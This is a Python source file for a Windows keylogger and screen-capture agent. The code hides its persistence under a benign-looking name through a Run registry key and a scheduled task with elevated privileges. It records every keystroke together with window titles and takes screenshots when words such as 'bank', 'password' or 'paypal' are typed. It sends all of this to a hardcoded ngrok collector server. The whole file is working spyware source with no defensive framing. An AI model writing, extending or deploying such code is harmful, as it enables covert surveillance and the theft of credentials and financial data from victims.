# agent.py - WITH SCHEDULED TASK PERSISTENCE
import os, time, queue, threading, requests, uuid, base64, hmac, hashlib
from pynput import keyboard
from datetime import datetime,timezone
import socket
import sys
import subprocess
import platform

# screenshot library
import mss
import io

# CONFIG
COLLECTOR =  "https://unerosive-noninterpretable-sally.ngrok-free.dev"
API_TOKEN = "Hfpv9f04J@!29Kk2fla00Asd9(==!3p"
HMAC_SECRET = b"JSk!f923jfsd0-23jjJJJ(*@23jkdf90J"

AGENT_ID = os.getenv("AGENT_ID") or socket.gethostname() or ("vm-" + str(uuid.uuid4())[:8])

# Queues
text_q = queue.Queue()

# Batch settings
BATCH_INTERVAL = 5  # seconds
MAX_BATCH_SIZE = 200  # chars

# ============================================================================
# PERSISTENCE FUNCTION - SCHEDULED TASK
# ============================================================================
# ============================================================================
# PERSISTENCE FUNCTION - REGISTRY & SCHEDULED TASK
# ============================================================================
def install_persistence():
    """
    Installs persistence using both Registry (Run Key) and Scheduled Tasks.
    Tries to be as robust as possible.
    """
    if platform.system() != "Windows":
        return False
    
    persistence_established = False

    try:
        # 1. Determine Paths
        # We want to run with pythonw.exe to avoid console window
        python_exe = sys.executable
        pythonw_exe = python_exe.replace("python.exe", "pythonw.exe")
        
        # If pythonw doesn't exist (weird setup), fall back to python.exe
        if not os.path.exists(pythonw_exe):
            pythonw_exe = python_exe

        script_path = os.path.abspath(sys.argv[0])
        
        # Command to run: "C:\Path\To\pythonw.exe" "C:\Path\To\one.py"
        run_command = f'"{pythonw_exe}" "{script_path}"'
        
        # 2. Method A: Registry (HKCU Run Key)
        # This is very reliable for user-level persistence
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE
            )
            # Validates and updates the registry key every time
            winreg.SetValueEx(key, "SystemMaintenanceTask", 0, winreg.REG_SZ, run_command)
            winreg.CloseKey(key)
            persistence_established = True
        except Exception:
            pass

        # 3. Method B: Scheduled Task (Fallback/Redundancy)
        try:
            task_name = "SystemMaintenanceTask"
            
            # Always try to create/update with /f (Force)
            # /sc onlogon = Run when this user logs on
            # /tr ... = Task run command
            # /rl highest = Try to get highest privs
            # /f = Force overwrite
            subprocess.run([
                'schtasks', '/create',
                '/tn', task_name,
                '/tr', run_command,
                '/sc', 'onlogon',
                '/rl', 'highest', 
                '/f'
            ], capture_output=True, text=True, creationflags=subprocess.CREATE_NO_WINDOW)
            persistence_established = True
        except Exception:
            pass

    except Exception:
        pass
    
    return persistence_established

# ============================================================================
# ORIGINAL AGENT CODE BELOW
# ============================================================================

def sign(agent_id, payload_bytes):
    msg = agent_id.encode() + payload_bytes
    sig = hmac.new(HMAC_SECRET, msg, hashlib.sha256).digest()
    return base64.b64encode(sig).decode()

def sender_thread():
    session = requests.Session()
    headers = {"X-Auth-Token": API_TOKEN}
    batch = ""
    last_send = time.time()
    while True:
        try:
            item = text_q.get(timeout=1)
            if item is None:
                break
            batch += item
    
            # send when interval elapsed or batch big
            if len(batch) >= MAX_BATCH_SIZE or (time.time() - last_send) >= BATCH_INTERVAL:
                payload = batch.encode("utf-8")
                headers2 = headers.copy()
                headers2["X-Signature"] = sign(AGENT_ID, payload)
                try:
                    session.post(COLLECTOR + "/collect/text", data={"agent_id": AGENT_ID, "data": batch}, headers=headers2, timeout=5)
                except Exception as e:
                    # fallback: write local
                    with open("local_fallback.log", "a", encoding="utf-8") as f:
                        f.write(batch)

                batch = ""
                last_send = time.time()
        except queue.Empty:
            # flush periodically
            if batch and (time.time() - last_send) >= BATCH_INTERVAL:
                payload = batch.encode("utf-8")
                headers2 = headers.copy()
                headers2["X-Signature"] = sign(AGENT_ID, payload)
                try:
                    session.post(COLLECTOR + "/collect/text", data={"agent_id": AGENT_ID, "data": batch}, headers=headers2, timeout=5)
                except:
                    with open("local_fallback.log", "a", encoding="utf-8") as f:
                        f.write(batch)

                batch = ""
                last_send = time.time()


def format_key(key):
    raw = str(key).replace("'", "")

    # Remove any accidental timestamps inside raw key
    if "T" in raw and "Z" in raw:
        parts = raw.split("Z")
        raw = parts[-1].strip()

    # Convert key names into readable characters
    if raw == "Key.space":
        char = " "
    elif raw == "Key.enter":
        char = "[enter]"
    elif raw.startswith("Key."):
        char = f"[{raw.split('.', 1)[1]}]"
    else:
        char = raw

    # Add our clean timestamp
    timestamp = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")

    return f"{timestamp} {char}\n"


# ... imports
import ctypes
# ...

# GLOBAL for Window tracking
current_window = None

def get_active_window():
    try:
        hwnd = ctypes.windll.user32.GetForegroundWindow()
        length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
        buff = ctypes.create_unicode_buffer(length + 1)
        ctypes.windll.user32.GetWindowTextW(hwnd, buff, length + 1)
        return buff.value
    except:
        return "Unknown"

# TRIGGER CONFIG
TRIGGER_WORDS = ["bank", "login", "password", "paypal", "admin", "dashboard", "transfer", "credit", "card"]
key_buffer = ""

def on_press(key):
    global current_window, key_buffer
    
    # 1. Capture Key String
    char_str = ""
    try:
        if hasattr(key, 'char') and key.char:
            char_str = key.char
        else:
            # For special keys, we might want to reset buffer or ignore
            # But specific things like "Space" or "Enter" are separators
            if key == keyboard.Key.space:
                char_str = " "
            elif key == keyboard.Key.enter:
                char_str = "\n"
    except:
        pass

    # 2. Update Window Context
    try:
        new_window = get_active_window()
        if new_window != current_window:
            current_window = new_window
            ts = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
            text_q.put(f"\n[WIN: {new_window}]\n")
            screenshot_event.set()
    except:
        pass

    # 3. Check Triggers
    if char_str:
        key_buffer += char_str.lower()
        if len(key_buffer) > 50:
            key_buffer = key_buffer[-50:] # Keep last 50 chars
        
        for word in TRIGGER_WORDS:
            if word in key_buffer:
                # HIT! Take screenshot
                screenshot_event.set()
                key_buffer = "" # Reset to avoid double triggering
                break

    # 4. Enqueue Key
    try:
        text_q.put(format_key(key))
    except Exception:
        pass

# GLOBAL EVENT for screenshots
screenshot_event = threading.Event()

def screenshot_worker(timeout=300):
    session = requests.Session()
    headers = {"X-Auth-Token": API_TOKEN}
    with mss.mss() as sct:
        while True:
            # Wait for event (window change) OR timeout (5 mins)
            screenshot_event.wait(timeout=timeout)
            screenshot_event.clear() # Reset flag
            
            # Take Screenshot
            try:
                img = sct.shot(output="screenshot.png")
            except TypeError:
                s = sct.grab(sct.monitors[0])
                import PIL.Image
                im = PIL.Image.frombytes("RGB", s.size, s.rgb)
                buf = io.BytesIO()
                im.save(buf, format="PNG")
                img_bytes = buf.getvalue()
            else:
                if isinstance(img, str):
                    with open(img, "rb") as f:
                        img_bytes = f.read()
                    try: os.remove(img)
                    except: pass
                else:
                    img_bytes = img

            # Send
            sig = sign(AGENT_ID, img_bytes)
            headers2 = headers.copy()
            headers2["X-Signature"] = sig
            files = {"screenshot": ("screen.png", img_bytes, "image/png")}
            data = {
                "agent_id": AGENT_ID,
                "window_title": current_window or "Unknown",
                "trigger_reason": "window_change"  # or "trigger_word" or "periodic"
            }
            try:
                session.post(COLLECTOR + "/collect/screenshot", data=data, files=files, headers=headers2, timeout=10)
            except Exception as e:
                pass 
                
            # Sleep a tiny bit to avoid rapid-fire if window flickers
            time.sleep(2)

if __name__ == "__main__":
    # INSTALL PERSISTENCE FIRST
    install_persistence()
    
    # start sender
    t = threading.Thread(target=sender_thread, daemon=True)
    t.start()
    
    # start screenshot thread (wait max 5 mins usually)
    sthread = threading.Thread(target=screenshot_worker, args=(300,), daemon=True)
    sthread.start()
    # start keyboard listener (blocks)
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()
    text_q.put(None)
    t.join()